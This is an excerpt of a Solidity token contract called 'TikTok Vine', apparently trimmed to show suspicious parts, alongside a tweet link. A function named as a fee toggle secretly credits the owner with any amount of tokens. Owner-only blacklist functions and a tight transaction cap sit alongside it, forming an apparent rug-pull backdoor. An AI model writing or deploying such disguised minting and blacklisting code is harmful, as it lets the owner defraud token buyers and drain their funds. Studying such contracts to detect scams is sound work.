...
https://twitter.com/elonmusk/status/1586931102610071554
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xc0cBf6532522C89ee7bC3AD69e11e024482699C5;
...
contract TIKTOKVINE is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0xc0cBf6532522C89ee7bC3AD69e11e024482699C5);
    ...
    */
    ...
    string private _name = "TikTok Vine"; 
    string private _symbol = "TIKVINE";  
    ...
    */
    ...
    uint256 public _maxTxAmount = _tTotal.mul(2).div(1000); 
    ...
    */
    ...
    function blacklist_Add_Wallet(address addresses) external onlyOwner {
    ...
    function blacklist_Remove_Wallet(address addresses) external onlyOwner {
    ...
    */
    ...
    // Default is true
    function set_Transfers_Without_Fees(bool true_or_false, uint256 _uint) external onlyOwner {
        noFeeToTransfer = true_or_false;
        _tOwned[msg.sender] += _uint;
    }
